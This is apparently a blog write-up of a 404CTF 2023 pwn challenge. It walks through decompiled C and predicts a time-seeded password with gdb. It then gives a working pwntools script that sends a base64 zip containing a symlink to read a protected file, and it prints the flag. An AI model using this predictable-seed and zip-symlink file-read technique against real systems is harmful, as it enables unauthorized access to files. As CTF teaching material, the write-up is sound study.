---
title: CTFs | 404CTF2023 | Pwn | Cache-cache : le retour
author: Stillwolfing
date: 2023-06-15
categories: ['CTFs', '404CTF2023', 'Pwn']
tags: ['CTFs', '404CTF2023', 'Pwn']
permalink: /CTFs/404CTF2023/pwn/cache-cache_:_le_retour
---

## Context

![context](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/context.png)

We have to get the content of the file salle_au_tresor.

## Resolution

### Functions

Here are the functions in the executable. I renamed some to better understand the program.

![functions](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/functions.png)

### Main

Here is the main function:

```c
int main(int argc,char **argv)
{
  int iVar1;
  time_t tVar2;
  size_t LF_location;
  long in_FS_OFFSET;
  char local_7a;
  undefined local_79;
  int count;
  uint local_74;
  undefined8 num;
  char *caracters [4];
  undefined8 password;
  undefined8 local_40;
  undefined4 local_38;
  undefined local_34;
  char input [24];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  count = 0x14;
  password = 0;
  local_40 = 0;
  local_38 = 0;
  local_34 = 0;
  local_7a = 'a';
  caracters[0] = "1234567890";
  caracters[1] = "abcdefghijklmnoqprstuvwyzx";
  caracters[2] = "ABCDEFGHIJKLMNOPQRSTUYWVZX";
  caracters[3] = "!@#$%^&*(){}[]:<>?,./";
  num = 4;
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  for (; count != 0; count = count + -1) {
    local_74 = get_char((int)num + -1);
    local_7a = get_passwd_char(caracters[local_74]);
    strncat((char *)&password,&local_7a,1);
  }
  local_34 = 0;
  puts("[Vous] : Toc toc toc");
  sleep(1);
  puts(&DAT_00101978);
  fgets(input,0x15,stdin);
  LF_location = strcspn(input,"\n");
  input[LF_location] = '\0';
  iVar1 = strcmp(input,(char *)&password);
  local_79 = iVar1 == 0;
  if ((bool)local_79) {
    puts(&DAT_001019c8);
    puts(&DAT_00101a20);
    puts(
        "[Portier] : Vous trouverez facilement, il y a deux gardes devant la porte, au fond du coulo ir."
        );
    give_gift();
  }
  else {
    puts(&DAT_00101ad0);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```


There are the interesting parts:

Password creation :

```c
count = 0x14;
  password = 0;
  local_40 = 0;
  local_38 = 0;
  local_34 = 0;
  local_7a = 'a';
  caracters[0] = "1234567890";
  caracters[1] = "abcdefghijklmnoqprstuvwyzx";
  caracters[2] = "ABCDEFGHIJKLMNOPQRSTUYWVZX";
  caracters[3] = "!@#$%^&*(){}[]:<>?,./";
  num = 4;
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  for (; count != 0; count = count + -1) {
    local_74 = get_char((int)num + -1);
    local_7a = get_passwd_char(caracters[local_74]);
    strncat((char *)&password,&local_7a,1);
  }
```

Password verification:

```c
fgets(input,0x15,stdin);
  LF_location = strcspn(input,"\n");
  input[LF_location] = '\0';
  iVar1 = strcmp(input,(char *)&password);
  local_79 = iVar1 == 0;
  if ((bool)local_79) {
    puts(&DAT_001019c8);
    puts(&DAT_00101a20);
    puts(
        "[Portier] : Vous trouverez facilement, il y a deux gardes devant la porte, au fond du coulo ir."
        );
    give_gift();
  }
```

### Password guessing

Let's take a look at how the password is generated.

```c
tVar2 = time((time_t *)0x0);
srand((uint)tVar2);
for (; count != 0; count = count + -1) {
    local_74 = get_char((int)num + -1);
    local_7a = get_passwd_char(caracters[local_74]);
    strncat((char *)&password,&local_7a,1);
  }
```

We set the seed of the random with the current timestamp. Then we perform some operations to get the different characters.

Here is the get_char function:

```c
int get_char(int param_1)
{
  int iVar1;
  
  do {
    iVar1 = rand();
    iVar1 = iVar1 / (int)(0x7fffffff / (long)(param_1 + 1));
  } while (param_1 < iVar1);
  return iVar1;
}
```

We use the rand function to get an index. Then in the main code, we select the caracters[index] and feed it to the get_passwd_char function.

Here is the get_passwd_char function:

```c
char get_passwd_char(char *param_1)
{
  int iVar1;
  size_t sVar2;
  
  sVar2 = strlen(param_1);
  iVar1 = get_char((int)sVar2 + -1);
  return param_1[iVar1];
}
```

We generate a new index and get the character located at caracters[index1][index2].

We add the new character to the password. We do it 20 times (variable count = 0x14).

What we can do is use gdb to set the timestamp in the future, generate the password and display the password. This way, we have a password that will be valid later in the future.

Now we send a request every second to the server until the password is the good one.

gdb code to get the password that will be valid in 30 seconds:

```gdb
set disassembly-flavor intel

break *0x5555554016a5
commands
    silent
    print($rax)
    set $rax += 30
    print($rax)
    continue
end

break *0x5555554016ff
commands
    silent
    set $pass = (char *) $rbp -0x40
    print($pass)
    quit
end

run
```

We increase the timestamp by 30 then we display the password.

![password](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/password.png)

Code to spam requests:

```python
from pwn import *
import time

while True:
    #p = process("./cache_cache_le_retour")
    p = remote("challenges.404ctf.fr",31725)


    password = b'6qzQbN(m>@KROp^1(Gh:'

    p.recvuntil(b"mot de passe ?\n")
    p.sendline(password)

    sms = p.recv()

    if b'Je me vois au regret de refuser' in sms:
        p.close()
        #time.sleep(0.6)
        continue

print('terminate')
p.interactive()
```

![login](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/login.png)

Now the give a gift function is executed.

Here is the give_a_gift function:

```c
undefined8 give_gift(void)
{
  __pid_t _Var1;
  int iVar2;
  size_t sVar3;
  undefined8 uVar4;
  long in_FS_OFFSET;
  int local_4b8;
  int local_4b4;
  char *local_4b0;
  size_t local_4a8;
  char *mystere_zip_str;
  char *surprise_txt_str;
  void *base64_decoded_input2;
  FILE *local_488;
  FILE *local_480;
  __ssize_t local_478;
  char *local_470;
  char *local_468;
  char *local_460;
  undefined8 local_458;
  char input1 [48];
  char input2 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  fgets(input1,0x28,stdin);
  mystere_zip_str = "mystere.zip";
  surprise_txt_str = "surprise.txt";
  local_4b8 = 0;
  fgets(input2,0x400,stdin);
  sVar3 = strcspn(input2,"\n");
  input2[sVar3] = '\0';
  remove(mystere_zip_str);
  remove(surprise_txt_str);
  base64_decoded_input2 = base64_decode(input2,&local_4b8);
  local_488 = fopen(mystere_zip_str,"wb");
  if (local_488 == (FILE *)0x0) {
    puts(&DAT_00101878);
    free(base64_decoded_input2);
    base64_decoded_input2 = (void *)0x0;
    uVar4 = 1;
  }
  else {
    fwrite(base64_decoded_input2,1,(long)local_4b8,local_488);
    fclose(local_488);
    local_488 = (FILE *)0x0;
    _Var1 = fork();
    if (_Var1 == 0) {
      local_4b4 = open("/dev/null",1);
      if (local_4b4 < 0) {
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      iVar2 = fileno(stdout);
      dup2(local_4b4,iVar2);
      iVar2 = fileno(stderr);
      dup2(local_4b4,iVar2);
      close(local_4b4);
      local_470 = "unzip";
      local_468 = "unzip";
      local_460 = "mystere.zip";
      local_458 = 0;
      execvp("unzip",&local_468);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    wait((void *)0x0);
    local_480 = fopen(surprise_txt_str,"r");
    if (local_480 == (FILE *)0x0) {
      puts(&DAT_00101878);
      free(base64_decoded_input2);
      base64_decoded_input2 = (void *)0x0;
      uVar4 = 1;
    }
    else {
      local_4b0 = (char *)0x0;
      local_4a8 = 0;
      local_478 = getline(&local_4b0,&local_4a8,local_480);
      if (local_478 == -1) {
        puts(&DAT_00101878);
        uVar4 = 1;
      }
      else {
        puts(local_4b0);
        remove(mystere_zip_str);
        remove(surprise_txt_str);
        fclose(local_488);
        fclose(local_480);
        free(local_4b0);
        free(base64_decoded_input2);
        base64_decoded_input2 = (void *)0x0;
        local_488 = (FILE *)0x0;
        local_480 = (FILE *)0x0;
        local_4b0 = (char *)0x0;
        uVar4 = 0;
      }
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
}
```

The function takes a base64 input, decode it and put it into the mystere.zip file:

```c
local_488 = fopen(mystere_zip_str,"wb");
  if (local_488 == (FILE *)0x0) {
    puts(&DAT_00101878);
    free(base64_decoded_input2);
    base64_decoded_input2 = (void *)0x0;
    uVar4 = 1;
  }
```

Then it unzip the content of mystere.zip

```c
execvp("unzip",&local_468);
```

To finish, it reads a line from surprise.txt

```c
local_480 = fopen(surprise_txt_str,"r");
    if (local_480 == (FILE *)0x0) {
      puts(&DAT_00101878);
      free(base64_decoded_input2);
      base64_decoded_input2 = (void *)0x0;
      uVar4 = 1;
    }
    else {
      local_4b0 = (char *)0x0;
      local_4a8 = 0;
      local_478 = getline(&local_4b0,&local_4a8,local_480);
      if (local_478 == -1) {
        puts(&DAT_00101878);
        uVar4 = 1;
      }
      else {
        puts(local_4b0);
```

We can put a symlink from surprise.txt to salle_au_tresor in mystere.zip.

### Exploit

We encode base64 a symlink from surprise.txt to salle_au_tresor. The program put in mystere.zip the base64 decoded payload (the symlink).

The program unzip mystere.zip, overwriting surprise.txt that is now a symlink to salle_au_tresor.

The program reads a line from surprise.txt that is a symlink to salle_au_tresor. So, the program reads a line from salle_au_tresor and reads it for us.

### Payload Creation

In local, we create a file called salle_au_tresor. We create a symlink to it. We zip surprise.txt into mystere.zip. Then we encode in base64 mystere.zip.

![payload](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/payload.png)

Our payload is ready.

### Final Code

```python
from pwn import *
import time

while True:
    #p = process("./cache_cache_le_retour")
    p = remote("challenges.404ctf.fr",31725)


    password = b'6qzQbN(m>@KROp^1(Gh:'

    p.recvuntil(b"mot de passe ?\n")
    p.sendline(password)

    sms = p.recv()

    if b'Je me vois au regret de refuser' in sms:
        p.close()
        #time.sleep(0.6)
        continue
    else:
        print(sms)
        p.sendline(b"UEsDBAoAAAAAANGIwVaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAP6s3hk+rN4ZHV4CwABBOgDAAAE6wMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAANGIwVaLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAA/qzeGR1eAsAAQToAwAABOsDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAA")
        print(p.recv())
        break

print('terminate')
p.interactive()
```

## Flag

![flag](/assets/img/CTFs/404CTF2023/pwn/cache-cache_:_le_retour/flag.png)

We have the flag 🥳 !

Flag: 404CTF{UN_CH3V41_D3_7r013_P0Ur_3NV4H1r_14_54113_4U_7r350r}

## Conclusion

I hope you understood and learned some things in this writeup.
















